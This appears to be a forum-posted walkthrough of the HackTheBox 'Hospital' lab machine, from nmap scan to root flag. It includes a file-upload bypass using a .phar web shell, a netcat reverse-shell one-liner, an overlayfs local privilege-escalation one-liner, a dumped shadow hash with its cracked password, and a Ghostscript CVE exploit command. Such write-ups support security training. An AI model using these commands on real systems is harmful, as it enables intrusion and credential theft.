# Hospital -htb(Compi)


Nmap :
	huge list : Indications of a Active directory box.
	
```
Not shown: 65506 filtered tcp ports (no-response)  
PORT    STATE SERVICE          VERSION  
22/tcp  open  tcpwrapped  
| ssh-hostkey:  
|  256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)  
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)  
53/tcp  open  domain            Simple DNS Plus  
88/tcp  open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-19 02:04:14Z)  
135/tcp  open  msrpc            Microsoft Windows RPC  
139/tcp  open  netbios-ssn      Microsoft Windows netbios-ssn  
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC  
| Subject Alternative Name: DNS![Big Grin](https://breachforums.is/images/smilies/biggrin.png "Big Grin")C, DNS![Big Grin](https://breachforums.is/images/smilies/biggrin.png "Big Grin")C.hospital.htb  
| Not valid before: 2023-09-06T10:49:03  
|_Not valid after:  2028-09-06T10:49:03  
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)  
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28  
|_ssl-date: TLS randomness does not represent time  
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail  
| ssl-cert: Subject: commonName=localhost  
| Not valid before: 2009-11-10T23:48:47  
|_Not valid after:  2019-11-08T23:48:47  
| tls-alpn:  
|_  http/1.1  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  ldapssl?  
| ssl-cert: Subject: commonName=DC  
| Subject Alternative Name: DNS![Big Grin](https://breachforums.is/images/smilies/biggrin.png "Big Grin")C, DNS![Big Grin](https://breachforums.is/images/smilies/biggrin.png "Big Grin")C.hospital.htb  
| Not valid before: 2023-09-06T10:49:03  
|_Not valid after:  2028-09-06T10:49:03  
1801/tcp open  msmq?  
2103/tcp open  msrpc            Microsoft Windows RPC  
2105/tcp open  msrpc            Microsoft Windows RPC  
2107/tcp open  msrpc            Microsoft Windows RPC  
2179/tcp open  vmrdp?  
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC  
| Subject Alternative Name: DNS![Big Grin](https://breachforums.is/images/smilies/biggrin.png "Big Grin")C, DNS![Big Grin](https://breachforums.is/images/smilies/biggrin.png "Big Grin")C.hospital.htb  
| Not valid before: 2023-09-06T10:49:03  
|_Not valid after:  2028-09-06T10:49:03  
3269/tcp open  globalcatLDAPssl?  
| ssl-cert: Subject: commonName=DC  
| Subject Alternative Name: DNS![Big Grin](https://breachforums.is/images/smilies/biggrin.png "Big Grin")C, DNS![Big Grin](https://breachforums.is/images/smilies/biggrin.png "Big Grin")C.hospital.htb  
| Not valid before: 2023-09-06T10:49:03  
|_Not valid after:  2028-09-06T10:49:03  
3389/tcp open  ms-wbt-server    Microsoft Terminal Services  
| rdp-ntlm-info:  
|  Target_Name: HOSPITAL  
|  NetBIOS_Domain_Name: HOSPITAL  
|  NetBIOS_Computer_Name: DC  
|  DNS_Domain_Name: hospital.htb  
|  DNS_Computer_Name: DC.hospital.htb  
|  DNS_Tree_Name: hospital.htb  
|  Product_Version: 10.0.17763  
|_  System_Time: 2023-11-19T02:05:04+00:00  
| ssl-cert: Subject: commonName=DC.hospital.htb  
| Not valid before: 2023-09-05T18:39:34  
|_Not valid after:  2024-03-06T18:39:34  
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
6404/tcp open  msrpc            Microsoft Windows RPC  
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0  
6407/tcp open  msrpc            Microsoft Windows RPC  
6409/tcp open  msrpc            Microsoft Windows RPC  
6614/tcp open  msrpc            Microsoft Windows RPC  
6625/tcp open  msrpc            Microsoft Windows RPC  
6638/tcp open  msrpc            Microsoft Windows RPC  
8080/tcp open  tcpwrapped  
| http-title: Login  
|_Requested resource was login.php  
|_http-open-proxy: Proxy might be redirecting requests  
|_http-server-header: Apache/2.4.55 (Ubuntu)  
9389/tcp open  mc-nmf            .NET Message Framing  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

port 8080 site ENUM:
	loginpage with option to create acc.

		username/pass : chao/chao123

It has file upload capabilities but can only upload image .
But it also doesnt check whether the thing that i upload is actually in image or not, SO we could exploit this.

Enter `p0wny_Shell`:  Mind blowing stuff, check this video out.
https://www.youtube.com/watch?v=66YJlZXBmgA
	shell.php from p0wnyShell upload.---> It is giving me error, maybe because it checks       for extensions like php and restricts it.
	  
	To bypass this, just change the shell.php to shell.phar
	It will perfrom like a php file , infact phar is a complied version of php so it works.

---

Shell as www-data(p0wnyShell):
--
On `/var/www/html/uploads/ovlcap/upper` , i found a ELF executable named `magic`.

found `drwilliams` on /home ---> perm denied.

Further enum revealed that this machine's kernel is old and is vulneralbe to linux file overlay exploit:
https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/

But for that , we cant use this exploit from the p0wny shell, so we need netcat shell on our terminal.

open up a nc listener on kali
on p0wnyShell:
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc yourip 443 >/tmp/f`

Get ur connection back and now u can run the above exploit:
```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;  
  
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -i")'
```

***After that go to etc/shadow and grab drWlliams password hash.  Crack it***
```
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

Got the password : `drwilliams / qwe123!@#`

we had a port 443 port active on this domain, so lets check it out;
found a login page, use those creds gathered above:

logged in;

----

**Hospital WEBMAIL ENUM**:
--
Found a email sent to us from drBrown that says he needs a file with the format ".eps" so that it can be read with Ghostscript. Google GhostScript exploit and you will find a recent cve. 
Github the poc and you will find the exploit .
Modify the exploit to work with windows .
Get a shell.

From the POC use this command:
`python3 CVE_2023_36664_exploit.py --generate --payload "yourBase64encodedPowershellPayload" --filename revhsell --extension eps`


In you nc listener, get a connection back,
and get USER flag.

---

Shell as Dr Brown ENUM:
--
There is a Xampp folder in C. 
(`XAMPP is a local server and we can access files in it in our browser, in this case, we can access it from https://machineip/<whateverfileyouaretryingtoAcess>`)

Googling it , says it root directory is htdocs.
	--going to htdocs:
			found bunch of webshells.
			to access this  follow the above command and get root.

from google:
`**PHP files are saved in C:/Program Files/XAMPP/htdocs**. You have to open it, click on the program, and it will automatically run on localhost.`

You can grab a webshell just by googling.

root flag:
	`type C:\Users\Administrator\Desktop\root.txt`


pwned




`note : if you dont find webshells there, you need to upload your own.
just upload and execute.`
